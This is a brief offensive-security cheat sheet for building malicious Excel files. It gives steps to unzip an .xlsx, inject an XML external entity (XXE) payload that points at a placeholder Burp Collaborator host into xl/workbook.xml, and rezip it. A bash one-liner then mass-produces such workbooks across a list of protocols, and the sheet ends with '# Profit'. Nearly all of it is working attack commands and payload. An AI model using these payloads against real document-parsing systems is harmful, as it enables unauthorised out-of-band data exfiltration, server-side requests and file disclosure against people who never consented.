# Extract the Excel file
mkdir xxe && cd xxe
unzip ../xxe_[protocol].xlsx

# Add payload to xl/workbook.xml
<xml ...>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<x>&xxe;</x>
<workbook...>

# Rebuild the Excel file
zip -r ../xxe_[protocol].xlsx *

# One-liner
for protocol in $(cat ../xxe_protocols.txt); do cp -R xxe/ ./xxe_$(echo $protocol | cut -d : -f 1); sed -i "s|PROTOCOL|$protocol|g" xxe_$(echo $protocol | cut -d : -f 1)/xl/workbook.xml; sed -i 's/PAYLOAD/<burp_collaborator_payload_id>/' xxe_$(echo $protocol | cut -d : -f 1)/xl/workbook.xml; zip -r xxe_$(echo $protocol | cut -d : -f 1).xlsx xxe_$(echo $protocol | cut -d : -f 1)/*; done

# Profit
